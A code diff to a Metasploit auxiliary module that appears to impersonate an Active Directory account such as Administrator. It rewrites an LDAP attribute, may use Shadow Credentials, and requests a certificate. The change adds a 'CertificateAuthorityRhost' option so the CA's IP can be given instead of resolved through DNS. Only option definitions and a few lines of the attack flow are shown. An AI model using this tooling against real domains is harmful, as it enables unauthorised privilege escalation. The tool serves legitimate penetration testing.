@@ -67,7 +67,8 @@ class MetasploitModule < Msf::Auxiliary
       OptEnum.new('UPDATE_LDAP_OBJECT', [ true, 'Either userPrincipalName or dNSHostName, Updates the necessary object of a specific user before requesting the cert.', 'userPrincipalName', %w[userPrincipalName dNSHostName] ]),
       OptString.new('UPDATE_LDAP_OBJECT_VALUE', [ true, 'The account name you wish to impersonate', 'Administrator']),
       OptString.new('TARGET_USERNAME', [true, 'The username of the target LDAP object (the victim account).'], aliases: ['SMBUser']),
-      OptString.new('TARGET_PASSWORD', [false, 'The password of the target LDAP object (the victim account). If left blank, Shadow Credentials will be used to authenticate as the TARGET_USERNAME'], aliases: ['SMBPass'])
+      OptString.new('TARGET_PASSWORD', [false, 'The password of the target LDAP object (the victim account). If left blank, Shadow Credentials will be used to authenticate as the TARGET_USERNAME'], aliases: ['SMBPass']),
+      OptString.new('CertificateAuthorityRhost', [false, 'The IP Address of the CA. The module will attempt to resolve this via DNS if this is not set'])
     ])
 
     register_advanced_options(
@@ -216,7 +217,7 @@ class MetasploitModule < Msf::Auxiliary
       @device_id, cert_path = call_shadow_credentials_module('add')
       smbpass = automate_get_hash(cert_path, datastore['TARGET_USERNAME'], datastore['LDAPDomain'], datastore['RHOSTS'])
     end
-    ca_ip = resolve_ca_ip
+    ca_ip = datastore['CertificateAuthorityRhost'].present? ? datastore['CertificateAuthorityRhost'] : resolve_ca_ip
     with_ipc_tree do |opts|
       datastore['SMBUser'] = datastore['TARGET_USERNAME']
       datastore['SMBPass'] = smbpass
